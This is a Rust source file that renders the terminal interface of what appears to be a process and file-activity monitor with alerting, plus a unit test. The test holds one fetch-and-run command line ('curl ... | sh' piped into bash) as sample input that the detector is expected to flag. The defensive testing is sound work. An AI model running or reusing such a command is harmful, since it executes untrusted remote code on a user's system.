//! Rendering. Top: processes (tree features, alerts) or per-process file
//! counters. Bottom: alerts (once there are any) and the live event log.

use std::collections::VecDeque;
use std::time::SystemTime;

use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Cell, Paragraph, Row, Table, TableState};
use ratatui::Frame;

use super::app::{App, LogKind, LogLine, View};
use crate::core::event::FileOp;

/// HH:MM:SS in local time.
fn hms(t: SystemTime) -> String {
    chrono::DateTime::<chrono::Local>::from(t).format("%H:%M:%S").to_string()
}

fn op_style(op: FileOp) -> (&'static str, Color) {
    match op {
        FileOp::Create => ("CREATE", Color::Green),
        FileOp::Open => ("OPEN", Color::Blue),
        FileOp::Read => ("READ", Color::Cyan),
        FileOp::Write => ("WRITE", Color::Yellow),
        FileOp::Rename => ("RENAME", Color::Magenta),
        FileOp::Delete => ("DELETE", Color::Red),
    }
}

fn log_line(l: &LogLine) -> Line<'static> {
    let (label, color) = match l.kind {
        LogKind::Start => ("START", Color::DarkGray),
        LogKind::Exec => ("EXEC", Color::Gray),
        LogKind::Exit => ("EXIT", Color::DarkGray),
        LogKind::Alert => ("ALERT", Color::LightRed),
        LogKind::File(op) => op_style(op),
    };
    let dim = Style::new().fg(Color::DarkGray);
    let detail = match l.kind {
        LogKind::Alert => Style::new().fg(Color::LightRed),
        _ => Style::new(),
    };
    Line::from(vec![
        Span::styled(hms(l.time), dim),
        Span::raw(format!(" {:>7} {:<16.16} ", l.pid, l.name)),
        Span::styled(format!("{label:<7}"), Style::new().fg(color)),
        Span::styled(l.detail.clone(), detail),
    ])
}

pub fn draw(f: &mut Frame, app: &App, table: &mut TableState) {
    // The alerts panel appears with the first alert and grows to 5 lines.
    let alerts_height = if app.alerts.is_empty() { 0 } else { app.alerts.len().min(5) as u16 + 2 };
    let [head, top, alerts, log, keys] = Layout::vertical([
        Constraint::Length(1),
        Constraint::Percentage(55),
        Constraint::Length(alerts_height),
        Constraint::Fill(1),
        Constraint::Length(1),
    ])
    .areas(f.area());

    let bold = Style::new().add_modifier(Modifier::BOLD);
    let flagged = app.procs.iter().filter(|p| !p.alerts.is_empty()).count();
    f.render_widget(
        Line::from(vec![
            Span::styled(format!("{} v{}", super::NAME, super::VERSION), bold),
            Span::raw(format!(
                "   processes: {}   flagged: {}   events: {}   up: {}s   {}",
                app.procs.len(),
                flagged,
                app.events_total,
                app.started.elapsed().as_secs(),
                app.source
            )),
        ]),
        head,
    );

    match app.view {
        View::Processes => process_table(f, app, table, top),
        View::Files => file_table(f, app, table, top),
    }

    if !app.alerts.is_empty() {
        let title = format!(" alerts ({}) ", app.alerts.len());
        log_panel(f, &app.alerts, title, alerts);
    }
    log_panel(f, &app.log, " events ".into(), log);

    f.render_widget(
        Span::styled(
            " q quit · ↑/↓ select · Tab processes/files · a show idle (files)",
            Style::new().fg(Color::DarkGray),
        ),
        keys,
    );
}

/// The newest lines that fit.
fn log_panel(f: &mut Frame, lines: &VecDeque<LogLine>, title: String, area: Rect) {
    let visible = area.height.saturating_sub(2) as usize;
    let lines: Vec<Line> = lines.iter().skip(lines.len().saturating_sub(visible)).map(log_line).collect();
    f.render_widget(Paragraph::new(lines).block(Block::bordered().title(title)), area);
}

fn process_table(f: &mut Frame, app: &App, table: &mut TableState, area: Rect) {
    let header = Row::new(
        ["PID", "PPID", "DEPTH", "PARENT", "IMAGE", "H", "lnC", "ALERTS", "COMMAND LINE"].map(Cell::from),
    )
    .style(Style::new().add_modifier(Modifier::BOLD).fg(Color::Cyan));
    let rows = app.procs.iter().map(|p| {
        let style = if p.alerts.is_empty() { Style::new() } else { Style::new().fg(Color::LightRed) };
        Row::new(
            [
                p.pid.to_string(),
                p.ppid.to_string(),
                p.depth.to_string(),
                p.parent_image.clone(),
                p.image.clone(),
                format!("{:.2}", p.cmdline_entropy),
                format!("{:.1}", p.cmdline_complexity),
                p.alerts.join(", "),
                p.cmdline.clone(),
            ]
            .map(Cell::from),
        )
        .style(style)
    });
    let widths = [
        Constraint::Length(8),
        Constraint::Length(8),
        Constraint::Length(5),
        Constraint::Length(16),
        Constraint::Length(16),
        Constraint::Length(5),
        Constraint::Length(6),
        Constraint::Length(32),
        Constraint::Fill(1),
    ];
    let title = format!(
        " processes ({}) · flagged first, then newest · command line: H = entropy, lnC = log complexity ",
        app.procs.len()
    );
    f.render_stateful_widget(
        Table::new(rows, widths)
            .header(header)
            .block(Block::bordered().title(title))
            .row_highlight_style(Style::new().add_modifier(Modifier::REVERSED)),
        area,
        table,
    );
}

fn file_table(f: &mut Frame, app: &App, table: &mut TableState, area: Rect) {
    let header = Row::new(
        ["PID", "NAME", "EV/s", "CREATE", "OPEN", "READ", "WRITE", "RENAME", "DELETE"].map(Cell::from),
    )
    .style(Style::new().add_modifier(Modifier::BOLD).fg(Color::Cyan));
    let rows = app.visible().map(|r| {
        let c = &r.counts;
        let style = if r.rate > 0 { Style::new() } else { Style::new().fg(Color::DarkGray) };
        Row::new(
            [
                r.pid.to_string(),
                r.name.clone(),
                r.rate.to_string(),
                c.file_create_count.to_string(),
                c.file_open_count.to_string(),
                c.file_read_count.to_string(),
                c.file_write_count.to_string(),
                c.file_rename_count.to_string(),
                c.file_delete_count.to_string(),
            ]
            .map(Cell::from),
        )
        .style(style)
    });
    let widths = [
        Constraint::Length(8),
        Constraint::Min(16),
        Constraint::Length(6),
        Constraint::Length(8),
        Constraint::Length(8),
        Constraint::Length(8),
        Constraint::Length(8),
        Constraint::Length(8),
        Constraint::Length(8),
    ];
    let shown = app.visible().count();
    let title = if app.show_idle {
        format!(" files: all processes ({shown}) · counts are cumulative ")
    } else {
        format!(" files: processes with file activity ({shown}) · counts are cumulative ")
    };
    f.render_stateful_widget(
        Table::new(rows, widths)
            .header(header)
            .block(Block::bordered().title(title))
            .row_highlight_style(Style::new().add_modifier(Modifier::REVERSED)),
        area,
        table,
    );
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::cli::app::total;
    use crate::core::event::{Event, EventKind};
    use crate::core::framework::dispatch;
    use ratatui::{backend::TestBackend, Terminal};
    use std::path::PathBuf;

    fn ev(pid: u32, kind: EventKind) -> Event {
        Event { timestamp: SystemTime::now(), pid, kind }
    }
    fn start(pid: u32, ppid: u32, name: &str, cmdline: &str) -> Event {
        let (name, cmdline) = (name.into(), cmdline.into());
        ev(pid, EventKind::ProcessStart { name, exe: None, start_ticks: pid.into(), ppid, cmdline })
    }

    fn render(app: &App) -> String {
        let mut term = Terminal::new(TestBackend::new(140, 30)).unwrap();
        term.draw(|f| draw(f, app, &mut TableState::default())).unwrap();
        term.backend().to_string()
    }

    #[test]
    fn renders_process_and_file_views_and_event_log() {
        let mut app = App::new("live".into());
        let events = vec![
            start(10, 1, "editor", "editor notes.txt"),
            start(11, 1, "idle-proc", ""),
            ev(10, EventKind::File { op: FileOp::Write, path: Some(PathBuf::from("/home/u/notes.txt")) }),
            ev(10, EventKind::File { op: FileOp::Delete, path: None }),
            start(20, 1, "firefox", "firefox"),
            start(21, 20, "bash", "bash -c curl -s http://x | sh"),
        ];
        dispatch(events, &mut [&mut app]).unwrap();
        app.refresh();

        let out = render(&app);
        assert!(out.contains("flagged: 1"), "{out}");
        assert!(out.contains("ALERT") && out.contains("firefox -> bash, pipe to interpreter"), "{out}");
        assert_eq!(app.procs[0].pid, 21, "flagged process first");
        assert_eq!(app.rows[0].rate, 2);
        println!("{out}");

        // The process is gone; its alert stays.
        dispatch(vec![ev(21, EventKind::ProcessExit)], &mut [&mut app]).unwrap();
        app.refresh();
        let out = render(&app);
        assert!(out.contains("flagged: 0") && out.contains("alerts (1)"), "{out}");

        app.view = View::Files;
        let out = render(&app);
        assert!(out.contains("editor"), "{out}");
        assert!(out.contains("with file activity (1)"), "idle hidden by default:\n{out}");
        assert!(out.contains("/home/u/notes.txt"), "{out}");
        assert_eq!(total(&app.rows[0].counts), 2);
        assert_eq!(app.rows[0].rate, 0, "no file events since the previous tick");
        println!("{out}");
    }
}
